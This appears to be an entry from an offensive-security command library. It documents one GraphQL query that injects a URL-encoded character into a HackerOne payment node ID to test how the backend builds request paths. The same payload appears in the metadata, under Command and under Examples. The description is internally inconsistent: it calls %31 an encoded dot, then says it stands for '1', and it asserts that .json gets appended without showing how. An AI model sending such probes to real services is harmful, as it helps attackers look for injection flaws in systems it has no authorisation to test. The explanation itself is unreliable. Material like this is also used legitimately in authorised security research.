---
data: >-
  query { node(id: "gid://hackerone/PaymentsLibrary::Payment/%31") { ... on User
  { id } } }
tags:
  - injection
  - encoding
type: command
output: HTTP GET /payments/1.json
executor: graphql
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:25:53.606Z'
id: a65fd59e-8500-4c7f-9666-90aa76c062e3
verified: false
validated: true
submitted: true
---
# inject-encoded-dot

## Command

```graphql
query { node(id: "gid://hackerone/PaymentsLibrary::Payment/%31") { ... on User { id } } }
```

## Description

Injects an encoded dot (%2e, but here %31 for 1. to test) to append .json to the path, verifying decoding behavior.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| id | Encoded ID with %31 | Yes |

## Examples

### Basic Usage

```graphql
query { node(id: "gid://hackerone/PaymentsLibrary::Payment/%31") { ... on User { id } } }
```

## Expected Output

Backend HTTP GET /payments/1.json, confirming path appending.

## Related

- [[commands/inject-query-parameters]]
- [[procedures/Test-GraphQL-Node-Interface]]
